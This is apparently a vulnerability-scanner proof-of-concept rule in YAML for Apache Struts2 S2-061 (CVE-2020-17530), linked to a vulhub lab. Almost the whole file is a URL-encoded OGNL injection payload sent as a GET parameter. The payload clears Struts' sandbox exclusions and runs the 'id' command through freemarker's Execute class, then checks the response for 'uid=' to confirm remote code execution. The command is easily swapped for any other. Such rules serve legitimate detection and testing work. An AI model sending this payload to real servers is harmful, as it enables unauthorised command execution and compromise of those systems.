name: Struts2-061-CVE-2020-17530
rules:
  - method: GET
    path: >-
      /?id=%25%7b%0d%0a%28%23request.map%3d%23application.get%28%27org.apache.tomcat.InstanceManager%27%29.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.toString%28%29.substring%280%2c0%29+%2b+%0d%0a%28%23request.map.setBean%28%23request.get%28%27struts.valueStack%27%29%29+%3d%3d+true%29.toString%28%29.substring%280%2c0%29+%2b+%0d%0a%28%23request.map2%3d%23application.get%28%27org.apache.tomcat.InstanceManager%27%29.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.toString%28%29.substring%280%2c0%29+%2b%0d%0a%28%23request.map2.setBean%28%23request.get%28%27map%27%29.get%28%27context%27%29%29+%3d%3d+true%29.toString%28%29.substring%280%2c0%29+%2b+%0d%0a%28%23request.map3%3d%23application.get%28%27org.apache.tomcat.InstanceManager%27%29.newInstance%28%27org.apache.commons.collections.BeanMap%27%29%29.toString%28%29.substring%280%2c0%29+%2b+%0d%0a%28%23request.map3.setBean%28%23request.get%28%27map2%27%29.get%28%27memberAccess%27%29%29+%3d%3d+true%29.toString%28%29.substring%280%2c0%29+%2b+%0d%0a%28%23request.get%28%27map3%27%29.put%28%27excludedPackageNames%27%2c%23application.get%28%27org.apache.tomcat.InstanceManager%27%29.newInstance%28%27java.util.HashSet%27%29%29+%3d%3d+true%29.toString%28%29.substring%280%2c0%29+%2b+%0d%0a%28%23request.get%28%27map3%27%29.put%28%27excludedClasses%27%2c%23application.get%28%27org.apache.tomcat.InstanceManager%27%29.newInstance%28%27java.util.HashSet%27%29%29+%3d%3d+true%29.toString%28%29.substring%280%2c0%29+%2b%0d%0a%28%23application.get%28%27org.apache.tomcat.InstanceManager%27%29.newInstance%28%27freemarker.template.utility.Execute%27%29.exec%28%7b%27id%27%7d%29%29%0d%0a%7d
    follow_redirects: false
    expression: |
      response.body.bcontains(b'uid=')
detail:
  author: Jaky(https://github.com/momika233)
  links:
    - https://github.com/vulhub/vulhub/tree/master/struts2/s2-061